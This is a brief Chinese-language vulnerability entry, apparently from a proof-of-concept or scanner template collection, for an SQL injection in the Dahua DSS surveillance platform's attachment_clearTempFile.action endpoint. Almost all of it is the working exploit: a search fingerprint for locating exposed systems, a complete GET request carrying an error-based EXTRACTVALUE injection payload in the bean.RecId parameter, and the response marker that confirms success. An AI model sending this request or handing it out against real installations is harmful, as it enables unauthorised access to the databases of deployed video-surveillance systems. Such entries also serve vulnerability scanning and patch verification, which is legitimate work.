# 大华DSS监控系统attachment_clearTempFileSQL注入漏洞

大华 ｜ SQL注入 ｜ —
- **指纹**：`body="include/script/dahuaDefined/"`
- **请求**：`GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(1,concat(0x7e,md5(1),0x7e))%20or%20(%2799%27=%2799&bean.TabName=1 HTTP/1.1`
- **响应特征**：200 a0b923820